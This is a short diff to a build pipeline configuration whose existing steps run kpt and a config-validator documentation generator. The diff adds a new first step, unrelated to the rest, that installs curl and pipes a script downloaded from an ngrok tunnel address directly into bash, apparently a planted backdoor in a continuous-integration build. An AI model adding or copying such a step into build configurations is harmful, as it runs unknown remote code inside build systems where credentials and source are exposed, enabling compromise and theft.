@@ -1,4 +1,6 @@
 steps:
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - name: 'gcr.io/kpt-dev/kpt'
   args: ['fn', 'source', './samples/', './policies/' ]
 - name: 'gcr.io/config-validator/generate-docs:dev'
